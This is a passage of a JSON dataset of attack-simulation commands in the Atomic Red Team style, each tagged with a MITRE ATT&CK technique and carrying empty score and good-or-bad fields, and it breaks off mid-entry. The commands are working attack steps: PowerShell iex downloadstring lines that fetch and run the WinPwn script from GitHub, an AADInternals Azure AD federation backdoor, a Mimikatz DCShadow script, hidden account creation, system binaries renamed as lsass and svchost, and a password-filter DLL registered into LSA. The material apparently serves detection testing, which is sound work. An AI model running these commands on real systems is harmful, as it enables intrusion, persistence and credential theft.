        "MitreAttackClassification": "T1615",
        "Shell": "powershell"
    },
    {
        "ID": 1146,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput",
        "Description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1615",
        "Shell": "powershell"
    },
    {
        "ID": 1147,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPORemoteAccessPolicy -consoleoutput -noninteractive",
        "Description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1615",
        "Shell": "powershell"
    },
    {
        "ID": 1148,
        "Command": "Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\\GPO_Output.txt",
        "Description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1615",
        "Shell": "powershell"
    },
    {
        "ID": 1149,
        "Command": "Import-Module AzureAD\nImport-Module AADInternals\n\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\n\ntry {\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null\n}\ncatch {\n  Write-Host \"Error: AzureAD could not connect\"\n  exit 1\n}\n\ntry {\n  $domain = Get-AzureADDomain -Name \"contoso.com\"\n}\ncatch {\n  Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\n  exit 1\n}\nif (-Not $domain.IsVerified) {\n  Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\n  exit 1\n}\n\nif ($domain.AuthenticationType -eq \"Federated\") {\n  Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\n  exit 1\n}\n\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\nif (-Not $at) {\n  Write-Host \"Error: AADInternals could not connect\"\n  exit 1\n}\n\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\nif ($new) {\n  Write-Host \"Federation successfully added to Azure AD\"\n  Write-Host $new\n}\nelse {\n  Write-Host \"The federation setup failed\"\n}\n\nWrite-Host \"End of federation configuration.\"\n",
        "Description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1484.002",
        "Shell": "powershell"
    },
    {
        "ID": 1150,
        "Command": "odbcconf.exe /S /A {REGSVR \"PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll\"}\n",
        "Description": "Execute arbitrary DLL file stored locally.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1151,
        "Command": "cd \"PathToAtomicsFolder\\T1218.008\\bin\\\"\nodbcconf.exe -f \"T1218.008.rsp\"\n",
        "Description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.008",
        "Shell": "command_prompt"
    },
    {
        "ID": 1152,
        "Command": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done\n",
        "Description": "This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1619",
        "Shell": "sh"
    },
    {
        "ID": 1153,
        "Command": "az login\\t# Login to Azure\n\n# Get all storage accounts in the subscription\n$storageAccounts = az storage account list --query \"[].{name:name, resourceGroup:resourceGroup}\" --output json | ConvertFrom-Json\n\n$storageAccountObjects = @()\n$downloadedFunctionFiles = @()\n\nforeach ($account in $storageAccounts) {\n\\tWrite-Output \"`nFound storage account $($account.name)\"\n\n\\t$storageAccountObjects += [PSCustomObject]@{\n\\t\\tResourceGroup\\t  = $account.resourceGroup\n\\t\\tStorageAccountName = $account.name\n\\t\\tFileShareName\\t  = \"\"\n\\t\\tContainerName\\t  = \"\"\n\\t\\tBlobName\\t\\t   = \"\"\n\\t\\tTableName\\t\\t  = \"\"\n\\t\\tQueueName\\t\\t  = \"\"\n\\t}\n\n\\t$allowSharedKeyAccess = az storage account show --name $account.name --resource-group $account.resourceGroup --query \"allowSharedKeyAccess\"\n\\t\n\\tif ($allowSharedKeyAccess -eq \"false\") {\\t# $allowSharedKeyAccess could be true or null\n\\t\\tWrite-Output \"Shared key access is disabled for this storage account.\"\n\\t} else {\n\\t\\t$connectionString = az storage account show-connection-string --name $account.name --resource-group $account.resourceGroup --query connectionString --output tsv\n\\t\\t\n\\t\\t$fileShares = az storage share list --connection-string $connectionString --query \"[].name\" --output json | ConvertFrom-Json\n\\t\\tforeach($fileShare in $fileShares) {\n\\t\\t\\tWrite-Output \"Found file share: $($fileShare)\"\n\\t\\t\\t$storageAccountObjects += [PSCustomObject]@{\n\\t\\t\\t\\tResourceGroup\\t  = $account.resourceGroup\n\\t\\t\\t\\tStorageAccountName = $account.name\n\\t\\t\\t\\tFileShareName\\t  = $fileShare\n\\t\\t\\t\\tContainerName\\t  = \"\"\n\\t\\t\\t\\tBlobName\\t\\t   = \"\"\n\\t\\t\\t\\tTableName\\t\\t  = \"\"\n\\t\\t\\t\\tQueueName\\t\\t  = \"\"\n\\t\\t\\t}\n\\t\\t}\n\n\\t\\t$containers = az storage container list --connection-string $connectionString --query \"[].name\" --output json | ConvertFrom-Json\n\\t\\tforeach($container in $containers) {\n\\t\\t\\tWrite-Output \"Found container: $($container)\"\n\\t\\t\\t$storageAccountObjects += [PSCustomObject]@{\n\\t\\t\\t\\tResourceGroup\\t  = $account.resourceGroup\n\\t\\t\\t\\tStorageAccountName = $account.name\n\\t\\t\\t\\tFileShareName\\t  = \"\"\n\\t\\t\\t\\tContainerName\\t  = $container\n\\t\\t\\t\\tBlobName\\t\\t   = \"\"\n\\t\\t\\t\\tTableName\\t\\t  = \"\"\n\\t\\t\\t\\tQueueName\\t\\t  = \"\"\n\\t\\t\\t}\n\n\\t\\t\\t$blobs = az storage blob list --connection-string $connectionString --container-name $container --query \"[].name\" --output json | ConvertFrom-Json\n\n\\t\\t\\tforeach($blob in $blobs) {\n\\t\\t\\t\\tWrite-Output \"Found blob: $($blob)\"\n\\t\\t\\t\\t$storageAccountObjects += [PSCustomObject]@{\n\\t\\t\\t\\t\\tResourceGroup\\t  = $account.resourceGroup\n\\t\\t\\t\\t\\tStorageAccountName = $account.name\n\\t\\t\\t\\t\\tFileShareName\\t  = \"\"\n\\t\\t\\t\\t\\tContainerName\\t  = $container\n\\t\\t\\t\\t\\tBlobName\\t\\t   = $blob\n\\t\\t\\t\\t\\tTableName\\t\\t  = \"\"\n\\t\\t\\t\\t\\tQueueName\\t\\t  = \"\"\n\\t\\t\\t\\t}\n\\t\\t\\t}\n\\t\\t}\n\\t\\t\n\\t\\t$tables = az storage table list --connection-string $connectionString --query \"[].name\" --output json | ConvertFrom-Json\n\\t\\tforeach($table in $tables) {\n\\t\\t\\tWrite-Output \"Found table: $($table)\"\n\\t\\t\\t$storageAccountObjects += [PSCustomObject]@{\n\\t\\t\\t\\tResourceGroup\\t  = $account.resourceGroup\n\\t\\t\\t\\tStorageAccountName = $account.name\n\\t\\t\\t\\tFileShareName\\t  = \"\"\n\\t\\t\\t\\tContainerName\\t  = \"\"\n\\t\\t\\t\\tBlobName\\t\\t   = \"\"\n\\t\\t\\t\\tTableName\\t\\t  = $table\n\\t\\t\\t\\tQueueName\\t\\t  = \"\"\n\\t\\t\\t}\n\\t\\t}\n\\t\\t\n\\t\\t$queues = az storage queue list --connection-string $connectionString --query \"[].name\" --output json | ConvertFrom-Json\n\\t\\tforeach($queue in $queues) {\n\\t\\t\\tWrite-Output \"Found table: $($table)\"\n\\t\\t\\t$storageAccountObjects += [PSCustomObject]@{\n\\t\\t\\t\\tResourceGroup\\t  = $account.resourceGroup\n\\t\\t\\t\\tStorageAccountName = $account.name\n\\t\\t\\t\\tFileShareName\\t  = \"\"\n\\t\\t\\t\\tContainerName\\t  = \"\"\n\\t\\t\\t\\tBlobName\\t\\t   = \"\"\n\\t\\t\\t\\tTableName\\t\\t  = \"\"\n\\t\\t\\t\\tQueueName\\t\\t  = $queue\n\\t\\t\\t}\n\\t\\t}\n\\t}\n}\n\n# Store file lists to csv file\n$storageAccountObjects | Export-Csv -Path \"$env:temp\\T1619_storage_account_objects.csv\" -NoTypeInformation\nWrite-Output \"`nDownloaded storage account objects to $env:temp\\T1619_storage_account_objects.csv\"\n\n# Print lists that have been stored as csv file\n$storageAccountObjects | Format-Table -Property ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName -AutoSize -Wrap\n",
        "Description": "This test enumerates all existing storage accounts and tries to fetch for each account the contained storage account objects. The access to storage objects is only possible if Shared Key authorization is enabled (e.g this is the case per default for storage objects creaded by Azure Function Apps).\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.\n\nOutput format: Csv file that contains the found storage account objects\n- Columns: ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName\n- The content of these columns is filled out depending on the object. Not-required columns are left empt. Example: For a blob object the ResourceGroup, StorageAccountName, ContainerName, BlobName are filled out, the other fields are left empty.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1619",
        "Shell": "powershell"
    },
    {
        "ID": 1154,
        "Command": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"\n",
        "Description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1207",
        "Shell": "powershell"
    },
    {
        "ID": 1155,
        "Command": "sudo dscl . -create /Users/APT UniqueID 333\n",
        "Description": "Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.002",
        "Shell": "sh"
    },
    {
        "ID": 1156,
        "Command": "sudo dscl . -create /Users/APT IsHidden 1\n",
        "Description": "Add a hidden user on macOS using IsHidden optoin\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.002",
        "Shell": "sh"
    },
    {
        "ID": 1157,
        "Command": "NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0\n",
        "Description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1158,
        "Command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n",
        "Description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.005",
        "Shell": "sh"
    },
    {
        "ID": 1159,
        "Command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n",
        "Description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.005",
        "Shell": "sh"
    },
    {
        "ID": 1160,
        "Command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n",
        "Description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.005",
        "Shell": "sh"
    },
    {
        "ID": 1161,
        "Command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n",
        "Description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.005",
        "Shell": "sh"
    },
    {
        "ID": 1162,
        "Command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n",
        "Description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1163,
        "Command": "cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond\n",
        "Description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.003",
        "Shell": "sh"
    },
    {
        "ID": 1164,
        "Command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n",
        "Description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1165,
        "Command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\"\n",
        "Description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1166,
        "Command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n",
        "Description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1167,
        "Command": "copy \"PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe\" ($env:TEMP + \"\\svchost.exe\")\ntry { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id }\ncatch { $_; exit $_.Exception.HResult}\nStop-Process -ID $myT1036_003\n",
        "Description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.003",
        "Shell": "powershell"
    },
    {
        "ID": 1168,
        "Command": "copy \"$env:ComSpec\" ($env:TEMP + \"\\svchost.exe\")\n$myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036_003\n",
        "Description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.003",
        "Shell": "powershell"
    },
    {
        "ID": 1169,
        "Command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt\n",
        "Description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1170,
        "Command": "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n",
        "Description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "command_prompt"
    },
    {
        "ID": 1171,
        "Command": "netsh advfirewall firewall show rule name=all\n",
        "Description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "command_prompt"
    },
    {
        "ID": 1172,
        "Command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"netstat -Sp tcp\"; else cmd=\"netstat -ant\"; fi;\nif [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n",
        "Description": "Identify network configuration information.\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "sh"
    },
    {
        "ID": 1173,
        "Command": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n",
        "Description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "command_prompt"
    },
    {
        "ID": 1174,
        "Command": "$ports = Get-content \"PathToAtomicsFolder\\T1016\\src\\top-128.txt\"\n$file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n\\t$test = new-object system.Net.Sockets.TcpClient\n\\t$wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n\\t$wait.asyncwaithandle.waitone(250, $false) | Out-Null\n\\t$totalports++ | Out-Null\n\\tif ($test.Connected) {\n\\t\\t$result = \"$port open\" \n\\t\\tWrite-Host -ForegroundColor Green $result\n\\t\\t$result | Out-File -Encoding ASCII -append $file\n\\t\\t$totalopen++ | Out-Null\n\\t}\n\\telse {\n\\t\\t$result = \"$port closed\" \n\\t\\tWrite-Host -ForegroundColor Red $result\n\\t\\t$totalclosed++ | Out-Null\n\\t\\t$result | Out-File -Encoding ASCII -append $file\n\\t}\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n",
        "Description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "powershell"
    },
    {
        "ID": 1175,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet) \n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "command_prompt"
    },
    {
        "ID": 1176,
        "Command": "\"PathToAtomicsFolder\\T1016\\src\\qakbot.bat\"\n",
        "Description": "A list of commands known to be performed by Qakbot for recon purposes",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "command_prompt"
    },
    {
        "ID": 1177,
        "Command": "sudo defaults read /Library/Preferences/com.apple.alf\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n",
        "Description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "bash"
    },
    {
        "ID": 1178,
        "Command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%\n",
        "Description": "Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain\ncontroller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016",
        "Shell": "command_prompt"
    },
    {
        "ID": 1179,
        "Command": "control.exe \"PathToAtomicsFolder\\T1218.002\\bin\\calc.cpl\"\n",
        "Description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1180,
        "Command": "1. Navigate to [chrome://extensions](chrome://extensions) and\ntick 'Developer Mode'.\n\n2. Click 'Load unpacked extension...' and navigate to\n[Browser_Extension](../t1176/src/)\n\n3. Click 'Select'\n",
        "Description": "Turn on Chrome/Chromium developer mode and Load Extension found in the src directory",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1176",
        "Shell": "manual"
    },
    {
        "ID": 1181,
        "Command": "1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend\nin Chrome\n\n2. Click 'Add to Chrome'\n",
        "Description": "Install the \"Minimum Viable Malicious Extension\" Chrome extension",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1176",
        "Shell": "manual"
    },
    {
        "ID": 1182,
        "Command": "1. Navigate to [about:debugging](about:debugging) and\nclick \"Load Temporary Add-on\"\n\n2. Navigate to [manifest.json](./src/manifest.json)\n\n3. Then click 'Open'\n",
        "Description": "Create a file called test.wma, with the duration of 30 seconds\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1176",
        "Shell": "manual"
    },
    {
        "ID": 1183,
        "Command": "1. Navigate to https://microsoftedge.microsoft.com/addons/detail/fjnehcbecaggobjholekjijaaekbnlgj\nin Edge Chromium\n\n2. Click 'Get'\n",
        "Description": "Adversaries may use VPN extensions in an attempt to hide traffic sent from a compromised host. This will install one (of many) available VPNS in the Edge add-on store.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1176",
        "Shell": "manual"
    },
    {
        "ID": 1184,
        "Command": "\n# Chromium\n$chromium =  \"https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip\"\n\n# uBlock Origin Lite to test side-loading\n$extension = \"https://github.com/uBlockOrigin/uBOL-home/releases/download/uBOLite_2024.11.25.1376/uBOLite_2024.11.25.1376.chromium.mv3.zip\"\n\nSet-Location \"$env:TEMP\"\n\nSet-Variable ProgressPreference SilentlyContinue\nInvoke-WebRequest -URI $chromium -OutFile \"$env:TEMP\\chrome.zip\"\nInvoke-WebRequest -URI $extension -OutFile \"$env:TEMP\\extension.zip\"\n\n\nExpand-Archive chrome.zip -DestinationPath \"$env:TEMP\" -Force\nExpand-Archive extension.zip -Force\n\nStart-Process .\\chrome-win\\chrome.exe --load-extension=\"$env:TEMP\\extension\\\" -PassThru",
        "Description": "This test loads an unpacked extension in Google Chrome with the `--load-extension` parameter. This technique was previously used by the Grandoreiro malware to load a malicious extension that would capture the browsing history, steal cookies and other user information. Other malwares also leverage this technique to hijack searches, steal passwords, inject ads, and more.\n\nReferences:\nhttps://attack.mitre.org/techniques/T1176/\nhttps://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1176",
        "Shell": "powershell"
    },
    {
        "ID": 1185,
        "Command": "cmdkey /list\n",
        "Description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 1186,
        "Command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n",
        "Description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1556.002",
        "Shell": "powershell"
    },
    {
        "ID": 1187,
